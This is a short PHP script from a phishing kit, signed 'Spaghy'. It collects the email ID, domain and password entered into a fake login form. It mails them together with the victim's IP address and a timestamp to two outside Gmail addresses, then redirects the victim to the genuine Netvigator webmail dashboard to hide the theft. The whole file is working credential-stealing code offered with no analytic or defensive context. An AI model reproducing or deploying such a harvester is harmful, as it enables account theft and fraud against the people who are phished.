<?
$user=  $_POST['loginid'];
$domain=  $_POST['domain'];
$password=  $_POST['password'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");

  $subj = "$domain from $ip";
  $msg = "Email: $user@$domain.com\nPassword: $password\n\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By Spaghy\n-----------------------------------";
  $from = "From: $ip<results@hinet.net>";
  mail("iamback20132013@gmail.com,
cerij50@gmail.com", $subj, $msg, $from);
  header("Location:http://email.netvigator.com/netvigator/dashboard/email_c.html");

?>